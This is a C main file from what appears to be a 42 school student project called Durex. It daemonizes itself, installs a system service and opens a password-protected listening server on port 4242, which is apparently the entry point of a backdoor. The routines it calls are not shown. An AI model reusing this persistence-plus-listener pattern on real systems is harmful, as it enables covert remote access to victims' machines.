/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 13:28:52 by banthony          #+#    #+#             */
/*   Updated: 2019/11/15 14:48:17 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "Durex.h"

int main(void)
{
	t_server server;

	puts("banthony\nlfourque");
	if (!daemonize("./"))
		return (EXIT_FAILURE);
	install_service();
	ft_memset(&server, 0, sizeof(server));
	server.require_pass = true;
	create_server(&server, 4242, MAX_CLIENT);
	server_loop(&server);
	return (EXIT_SUCCESS);
}
